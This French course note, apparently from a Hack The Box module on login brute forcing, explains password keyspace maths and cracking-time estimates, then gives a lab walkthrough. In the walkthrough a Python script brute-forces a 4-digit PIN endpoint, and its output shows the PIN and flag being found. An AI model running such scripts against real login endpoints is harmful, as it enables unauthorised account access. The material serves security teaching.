---
tags:
  - brute-force
ordre: 3
---

# Attaques par force brute

Pour bien saisir le défi que représente la force brute, il est essentiel de comprendre les mathématiques sous-jacentes. La formule suivante détermine le nombre total de combinaisons possibles pour un mot de passe :

```mathml
Possible Combinations = Character Set Size^Password Length
```

Par exemple, un mot de passe de 6 caractères utilisant uniquement des lettres minuscules (taille du jeu de caractères de 26) a 26^6 (environ 300 millions) de combinaisons possibles. En revanche, un mot de passe de 8 caractères avec le même jeu de caractères a 26^8 (environ 200 milliards) de combinaisons. L'ajout de lettres majuscules, de chiffres et de symboles au jeu de caractères étend encore davantage l'espace de recherche de manière exponentielle.

Cette croissance exponentielle du nombre de combinaisons souligne l'importance de la longueur et de la complexité du mot de passe. Même une légère augmentation de la longueur ou l'inclusion de types de caractères supplémentaires peut augmenter de manière spectaculaire le temps et les ressources nécessaires pour une attaque par force brute (brute-force attack) réussie.

Considérons quelques scénarios pour illustrer l'impact de la longueur du mot de passe et du jeu de caractères sur l'espace de recherche :

||Longueur du mot de passe|Jeu de caractères|Combinaisons possibles|
|---|---|---|---|
|`Court et simple`|6|Lettres minuscules (a-z)|26^6 = 308,915,776|
|`Plus long mais toujours simple`|8|Lettres minuscules (a-z)|26^8 = 208,827,064,576|
|`Ajout de complexité`|8|Lettres minuscules et majuscules (a-z, A-Z)|52^8 = 53,459,728,531,456|
|`Complexité maximale`|12|Lettres minuscules et majuscules, chiffres et symboles|94^12 = 475,920,493,781,698,549,504|

Comme vous pouvez le voir, même une légère augmentation de la longueur du mot de passe ou l'inclusion de types de caractères supplémentaires étend considérablement l'espace de recherche. Cela augmente de manière significative le nombre de combinaisons possibles qu'un attaquant doit essayer, rendant la force brute de plus en plus difficile et chronophage. Cependant, le temps nécessaire pour casser un mot de passe ne dépend pas seulement de la taille de l'espace de recherche, il dépend également de la puissance de calcul (computational power) disponible de l'attaquant.

Plus le matériel de l'attaquant est puissant (par exemple, le nombre de GPU, de CPU ou de ressources de calcul basées sur le cloud qu'il peut utiliser), plus il peut faire de tentatives de mot de passe par seconde. Alors qu'un mot de passe complexe peut prendre des années à être forcé avec une seule machine, un attaquant sophistiqué utilisant un réseau distribué de ressources de calcul haute performance pourrait réduire ce temps de manière drastique.

![Graphique à barres comparant les temps de cassage de mots de passe pour des ordinateurs de base et des superordinateurs en fonction de différentes complexités de mot de passe.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/57/powern.png)

Le graphique ci-dessus illustre une relation exponentielle entre la complexité du mot de passe et le temps de cassage. À mesure que la longueur du mot de passe augmente et que le jeu de caractères s'élargit, le nombre total de combinaisons possibles croît de manière exponentielle. Cela augmente considérablement le temps nécessaire pour casser le mot de passe, même avec de puissantes ressources de calcul.

Comparaison entre l'ordinateur de base et le superordinateur :

- Ordinateur de base (1 million de mots de passe/seconde) : Adéquat pour casser rapidement des mots de passe simples, mais devient excessivement lent pour les mots de passe complexes. Par exemple, casser un mot de passe de 8 caractères utilisant des lettres et des chiffres prendrait environ 6,92 ans.
- Superordinateur (1 billion de mots de passe/seconde) : Réduit considérablement les temps de cassage pour les mots de passe plus simples. Cependant, même avec cette immense puissance, le cassage de mots de passe très complexes peut prendre un temps irréalisable. Par exemple, un mot de passe de 12 caractères avec tous les caractères ASCII prendrait encore environ 15 000 ans à casser.

## Casser le code PIN

**Pour suivre, démarrez le système cible via la section des questions en bas de la page.**

L'application de l'instance génère un code PIN aléatoire à 4 chiffres et expose un point de terminaison (endpoint) (`/pin`) qui accepte un code PIN comme paramètre de requête. Si le code PIN fourni correspond à celui qui a été généré, l'application répond avec un message de succès et un flag. Sinon, elle renvoie un message d'erreur.

Nous utiliserons ce simple script Python de démonstration pour forcer le point de terminaison `/pin` de l'API. Copiez et collez ce script Python ci-dessous sous le nom `pin-solver.py` sur votre machine. Vous n'aurez qu'à modifier les variables IP et port pour qu'elles correspondent aux informations de votre système cible.

```python
import requests  ip = "127.0.0.1"  # Change this to your instance IP address port = 1234       # Change this to your instance port number  # Try every possible 4-digit PIN (from 0000 to 9999) for pin in range(10000):     formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")     print(f"Attempted PIN: {formatted_pin}")      # Send the request to the server     response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")      # Check if the server responds with success and the flag is found     if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)         print(f"Correct PIN found: {formatted_pin}")         print(f"Flag: {response.json()['flag']}")         break
```

Le script Python parcourt systématiquement tous les codes PIN à 4 chiffres possibles (de 0000 à 9999) et envoie des requêtes GET au point de terminaison Flask avec chaque code PIN. Il vérifie le code de statut de la réponse et son contenu pour identifier le bon code PIN et capturer le flag associé.

```bash
Hiterof13@htb[/htb]$ python pin-solver.py  ... Attempted PIN: 4039 Attempted PIN: 4040 Attempted PIN: 4041 Attempted PIN: 4042 Attempted PIN: 4043 Attempted PIN: 4044 Attempted PIN: 4045 Attempted PIN: 4046 Attempted PIN: 4047 Attempted PIN: 4048 Attempted PIN: 4049 Attempted PIN: 4050 Attempted PIN: 4051 Attempted PIN: 4052 Correct PIN found: 4053 Flag: HTB{...}
```

La sortie du script montrera la progression de l'attaque par force brute, en affichant chaque code PIN tenté et son résultat correspondant. La sortie finale révélera le bon code PIN et le flag capturé, démontrant ainsi la réussite de l'attaque par force brute
---

← [[02 - Les principes fondamentaux de la sécurité des mots de passe]] | [[00 - Sommaire Login Brute Forcing|Sommaire]] | [[04 - Attaques par dictionnaire]] →
